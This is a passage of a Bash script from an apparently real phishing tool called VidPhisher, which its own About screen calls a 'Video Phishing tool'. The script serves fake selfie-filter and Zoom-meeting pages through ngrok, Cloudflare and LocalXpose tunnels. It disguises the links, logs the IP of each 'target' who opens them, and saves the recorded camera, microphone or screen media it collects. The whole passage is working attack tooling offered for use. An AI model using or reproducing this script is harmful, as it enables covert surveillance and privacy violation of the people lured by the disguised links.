            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
fi

# Ngrok Authtoken
if ! [[ -e "$HOME/.config/ngrok/ngrok.yml" ]]; then
    for try in 1 2; do
        echo -e "\n${ask}Enter your ngrok authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$vp_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$ngrok_help"
            sleep 4
        else
            $ngrok_command config add-authtoken ${authtoken}
            sleep 1
            break
        fi
    done
fi

# Loclx Authtoken
if ! [[ -e "$HOME/.localxpose/.access" ]]; then # if $loclx_command account status | grep -q "Error"; then
    for try in 1 2; do
        echo -e "\n${ask}Enter your loclx authtoken:${yellow}[${blue}Enter 'help' for help${yellow}]"
        printf "$vp_prompt"
        read authtoken
        if [ -z "$authtoken" ]; then
            echo -e "\n${error}No authtoken!\n\007"
            sleep 1
            break
        elif [ "$authtoken" == "help" ]; then
            echo -e "$loclx_help"
            sleep 4
        else
            if ! [ -d "$HOME/.localxpose" ]; then
                mkdir "$HOME/.localxpose"
            fi
            echo -n "$authtoken" > $HOME/.localxpose/.access
            sleep 1
            break
        fi
    done
fi


# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:

${cyan}[${white}1${cyan}] ${yellow}Selfie Filter
${cyan}[${white}2${cyan}] ${yellow}Online Meeting
${cyan}[${white}d${cyan}] ${yellow}Change Image Directory (current: ${red}${FOL}${yellow})
${cyan}[${white}t${cyan}] ${yellow}Change Type of Media (current: ${red}${TYPE}${yellow})
${cyan}[${white}p${cyan}] ${yellow}Change Default Port (current: ${red}${PORT}${yellow})
${cyan}[${white}s${cyan}] ${yellow}Change Default Duration (current: ${red}${DURATION}${yellow})
${cyan}[${white}x${cyan}] ${yellow}About
${cyan}[${white}m${cyan}] ${yellow}More tools
${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
"
sleep 1
if [ -z $OPTION ]; then
    exit 1
else
    if [[ $OPTION == true ]]; then
        printf "$vp_prompt"
        read option
    else
        option=$OPTION
    fi
fi
# Select template
    if echo $option | grep -q "1"; then
        dir="selfil"
        mask="https://take-selfie-with-premium-filters"
        break
    elif echo $option | grep -q "2"; then
        dir="om"
        mask="https://join-zoom-online-meeting"
        break
    elif echo $option | grep -q "t"; then
        echo -e "\n${ask}Enter type:${cyan}"
        printf "$vp_prompt"
        read typee
        if [[ $typee == "video" || $typee == "audio" || $typee == "screen" || $typee == "both" ]] ; then
            TYPE=$typee;
            echo -e "\n${success}Type changed to ${cyan}${TYPE}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid type!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "p"; then
        echo -e "\n${ask}Enter Port:${cyan}"
        printf "$vp_prompt"
        read pore
        if [ ! -z "${pore##*[!0-9]*}" ] ; then
            PORT="$pore";
            local_url="127.0.0.1:${PORT}"
            echo -e "\n${success}Port changed to ${cyan}${PORT}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid port!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "s"; then
        echo -e "\n${ask}Enter Media Duration:${cyan}"
        printf "$vp_prompt"
        read dure
        if [ ! -z "${dure##*[!0-9]*}" ] ; then
            DURATION="$dure";
            echo -e "\n${success}Duration changed to ${cyan}${DURATION}${green} successfully!\n"
            sleep 2
        else
            echo -e "\n${error}Invalid duration!\n\007"
            sleep 2
        fi
    elif echo $option | grep -q "d"; then
        echo -e "\n${ask}Enter Directory:${cyan}"
        printf "$vp_prompt"
        read dire
        if ! [ -d $dire ]; then
            echo -e "\n${error}Invalid directory!\n\007"
            sleep 2
        else
            FOL="$dire"
            echo -e "\n${success}Directory changed successfully!\n"
            sleep 2
        fi
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[VidPhisher]
$red[Version]    ${cyan} :[${version}]
$red[Description]${cyan} :[Video Phishing tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra]
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "$vp_prompt"
        read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "0"; then
        echo -e "\n${success}Thanks for using!\n"
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        OPTION=true
        sleep 1
    fi
done

if ! [ -d "$HOME/.site" ]; then
    mkdir "$HOME/.site"
else
    cd $HOME/.site
    rm -rf *
fi
cd "$cwd"
if [ -e websites.zip ]; then
    unzip websites.zip > /dev/null 2>&1
    rm -rf websites.zip
fi

if ! [ -d sites ]; then
    wget -q --show-progress https://github.com/KasRoudra/VidPhisher/releases/latest/download/websites.zip
    mkdir sites
    unzip websites.zip -d sites > /dev/null 2>&1
    rm -rf websites.zip
fi
cd sites
cp -r * "$HOME/.site"
# Hotspot required for termux
if $termux; then
    echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
    sleep 3
fi
echo -e "\n${info}Starting php server at localhost:${PORT}....\n"
netcheck
cd "$HOME/.site"
php -S 127.0.0.1:${PORT} > /dev/null 2>&1 &
sleep 2
status=$(curl -s --head -w %{http_code} 127.0.0.1:${PORT} -o /dev/null)
if echo "$status" | grep -q "404"; then
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
else
    echo -e "${success}PHP has been started successfully!\n"
fi
sleep 1
echo -e "${info2}Starting tunnelers......\n"
find "$tunneler_dir" -name "*.log" -delete
netcheck
args=""
if [ "$REGION" != false ]; then
    args="--region $REGION"
fi
if [ "$SUBDOMAIN" != false ]; then
    if [ "$args" == "" ]; then
        args="--subdomain $SUBDOMAIN"
    else
        args="$args --subdomain $SUBDOMAIN"
    fi
fi
$ngrok_command http $args "${local_url}" > /dev/null 2>&1 &
$cf_command tunnel -url "${local_url}" &> "$tunneler_dir/cf.log" &
$loclx_command tunnel --raw-mode http --https-redirect $args -t "${local_url}" &> "$tunneler_dir/loclx.log" &
sleep 10
cd "$HOME/.site"
sed "s+siteName+"$dir"+g" template.php > index.php
sed "s+mediaType+"$TYPE"+g" template.js | sed "s+recordingTime+"$DURATION"+g" > recorder.js
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z.]*.ngrok.io")
if ! [ -z "$ngroklink" ]; then
    ngrokcheck=true
else
    ngrokcheck=false
fi
for second in {1..10}; do
    if [ -f "$tunneler_dir/cf.log" ]; then
        cflink=$(grep -Eo "https://[-0-9a-z.]{4,}.trycloudflare.com" "$tunneler_dir/cf.log")
        sleep 1
    fi
    if ! [ -z "$cflink" ]; then
        cfcheck=true
        break
    else
        cfcheck=false
    fi
done
for second in {1..10}; do
    if [ -f "$tunneler_dir/loclx.log" ]; then
        loclxlink=$(grep -o "[-0-9a-z.]*.loclx.io" "$tunneler_dir/loclx.log")
        sleep 1
    fi
    if ! [ -z "$loclxlink" ]; then
        loclxcheck=true
        loclxlink="https://${loclxlink}"
        break
    else
        loclxcheck=false
    fi
done
if ( $ngrokcheck && $cfcheck && $loclxcheck ); then
    echo -e "${success}Ngrok, Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
    url_manager "$loclxlink" 5 6
elif ( $ngrokcheck && $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok and Cloudflared have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$ngroklink" 3 4
elif ( $ngrokcheck && $loclxcheck &&  ! $cfcheck ); then
    echo -e "${success}Ngrok and Loclx have started successfully!\n"
    url_manager "$ngroklink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $cfcheck && $loclxcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared and Loclx have started successfully!\n"
    url_manager "$cflink" 1 2
    url_manager "$loclxlink" 3 4
elif ( $ngrokcheck && ! $cfcheck &&  ! $loclxcheck ); then
    echo -e "${success}Ngrok has started successfully!\n"
    url_manager "$ngroklink" 1 2
elif ( $cfcheck &&  ! $ngrokcheck &&  ! $loclxcheck ); then
    echo -e "${success}Cloudflared has started successfully!\n"
    url_manager "$cflink" 1 2
elif ( $loclxcheck && ! $ngrokcheck &&  ! $cfcheck ); then
    echo -e "${success}Loclx has started successfully!\n"
    url_manager "$loclxlink" 1 2
elif ! ( $ngrokcheck && $cfcheck && $loclxcheck ) ; then
    echo -e "${error}Tunneling failed! Start your own port forwarding/tunneling service at port ${PORT}\n";
fi
sleep 1
rm -rf ip.txt log.txt
find . -name "*.webm" -type f -delete
find . -name "*.mp4" -type f -delete
find . -name "*.mkv" -type f -delete
find . -name "*.gif" -type f -delete
find . -name "*.wav" -type f -delete
find . -name "*.ogg" -type f -delete
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target has opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> "$cwd/ip.txt"
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}Video/Audio has been downloaded! Check directory!\n"
        file=$(ls | grep webm || ls | grep mp4 || ls | grep mkv || ls | grep gif || ls | grep ogg || ls | grep wav)
        if ! [[ -z "$file" ]]; then
            onefile=$(echo $file | head -n1)
            mv -f "$onefile" "$FOL"
        fi
        rm -rf log.txt
    fi
    sleep 0.5
done


